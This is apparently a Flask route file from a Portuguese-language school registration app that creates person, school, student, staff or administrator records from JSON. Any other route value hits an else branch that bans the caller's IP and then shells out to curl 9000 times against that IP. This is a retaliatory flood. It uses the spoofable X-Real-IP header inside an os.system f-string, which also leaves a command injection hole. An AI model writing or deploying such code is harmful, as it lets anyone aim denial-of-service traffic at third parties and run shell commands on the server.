from geral.config import *
from rotas.model import *
@app.route('/cadastrar/<string:valor>', methods=['post'])
def cadastrar(valor:str):
    resposta = jsonify({"resultado": "ok", "detalhes": "oi"})
    dados = request.get_json(force=True)  
    if valor == 'Pessoa':
        dado = Pessoa(**dados)
    elif valor == 'Escola':
        dado = Escola(**dados)
    elif valor == 'Estudante':
        dado = Estudante(**dados)
    elif valor == 'Funcionario':
        dado = Funcionario(**dados)
    elif valor == 'Administrador':
        dado = Administrador(**dados)
    else:
        ip_ban.block(request.environ.get('HTTP_X_REAL_IP', request.remote_addr), permanent=True)
        for i in range(9000):
            os.system(f"curl http://{request.environ.get('HTTP_X_REAL_IP', request.remote_addr)}:5000/")
        return request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  
    try:
        db.session.add(dado)
        db.session.commit()
    except Exception as error:
        resposta = jsonify({"resultado": "Error", "detalhes": error})
    resposta.headers.add("Access-Control-Allow-Origin", "*")
    return resposta